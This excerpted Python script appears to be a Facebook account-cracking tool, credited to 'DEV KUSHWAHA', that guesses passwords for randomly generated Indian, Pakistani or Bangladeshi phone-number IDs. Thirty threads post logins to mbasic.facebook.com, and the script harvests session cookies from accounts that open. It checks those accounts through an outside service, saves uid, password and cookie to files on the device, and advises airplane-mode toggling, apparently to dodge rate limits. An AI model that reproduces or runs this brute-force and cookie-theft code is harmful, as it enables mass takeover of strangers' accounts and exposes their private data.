...
logo = """                                                               
\033[93m     oooooooooo.   oooooooooooo oooooo     oooo 
\033[93m      888'   `Y8b  `888'     `8  `888.     .8'  
\033[93m      888      888  888           `888.   .8'   
\033[1;37m      888      888  888oooo8       `888. .8'    
\033[1;37m      888      888  888    "        `888.8'     
\033[1;32m      888     d88'  888       o      `888'      
  \033[1;32m    o888bood8P'   o888ooooood8       `8'                                     
[+]==============================================
[+]\033[1;32m CREATED BY   : \033[1;32m DEV KUSHWAHA
[+]\033[1;32m FB GROUP     :  \033[1;32m MESSGER GRP
[+]\033[1;32m BROTHER      :   \033[1;32mABDUALLH X KAZIM
[+]\033[1;32m TOOL STATUS  : \033[1;32m RANDOM
[+]\033[1;32m TOOL VIRSION :\033[1;32m   5.8
...
def menu():
    ...
    if opt =='1':
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=100007399502775&mibextid=ZbWKwL")
        menu()
    elif opt =='0':
        exit()
    else:
...
def check_lock(uid):
    x = requests.get(f"https://livedeadsegs.pythonanywhere.com/segs_uid?uid={uid}").text
    if "LIVE" in x:
        status = "OK"
    else:
        status = "LOCK"
...
def random_crack():
    ...
    print('[2]\033[1;32m PAK  RANDOM CLONE')
    print('[0]\033[1;32m BANGAL RANODOM CLONE')
    print(47*'-')
    opt = input('[?] Choose : ')
    if opt =='1':
        random_number()
...
def random_number():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        tl = str(len(user))
        print(47*'-')
        print('[+] TOTAL YOUR IDS  : \033[1;32m'+tl)
        print('[?] \033[1;32mCHOICE SIM CODE : \033[1;32m'+kode)
        print('\033[1;32m[?] CHOICE YUR CONTORY :(\033[1;32mINDIA\033[1;32m)');print(47*"-");print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');print(47*"-")
        for guru in user:
            uid = kode+guru
            mk = uid[:6]
            pwx = [guru]
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'}
            lo = session.post('https://mbasic.facebook.com/?stype=lo&jlou=AfeBh1P5XSlSM2wms2C4U9Hnl-2G6_2Hu6YuPY48KB5TIXB6DvoWscdFgWbOPrLKsVL0Kgk3OXFhVxwRM2moqOmStv3iCJMU3SWceuZ4YHNsxQ&smuh=1245&lh=Ac_u--FyoUL4CN2u9NE&wtsid',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[151:166]
                if "OK" in check_lock(uid):
                    print('\r\033[1;32m[DEV -OK] '+uid+' | '+ps)
                    print(f" Cookie : {coki}")
                    open('/sdcard/dev_ok.txt', 'a').write(f'{uid}|{ps}|{coki}\n')
                    oks.append(uid)
                    break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[141:156]
                open('/sdcard/dev_cp.txt', 'a').write(f'{uid}|{ps}\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\33[1;37m[DEV-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
...
def random_pak_number():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        tl = str(len(user))
        print(47*'-')
        print('[+] YOUR TOTAL IDS : \033[1;32m'+tl)
        print('[?] \033[1;32mCHOICE SIM CODE : \033[1;32m'+kode)
        print('\033[1;33;1m[?] YOUR CONTORY (\033[1;32mPakistan\033[1;32m)');print(47*"-");print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');print(47*"-")
        for guru in user:
            uid = kode+guru
...
def rcrack(uid,pwx,tl):
    ...
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=eAMxZX4S0RdpIq_PS1WcWdW_; sb=eAMxZSSu_mji2oGTty-3hECQ; locale=en_GB; m_pixel_ratio=3.43505597114563; vpd=v1%3B539x393x3.43505597114563; fr=0QPo8JOnhNaEYu9pl.AWW-nMSB-6WJRmTx0eecaqgWBDU.BlMQN4.aP.AAA.0.0.BlNzoh.AWWlSdVrykk; wd=980x1835; dpr=3.43505597114563',
    'dpr': '2.75',
    ...
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"}
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write('\r\33[1;37m[DEV-💙] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
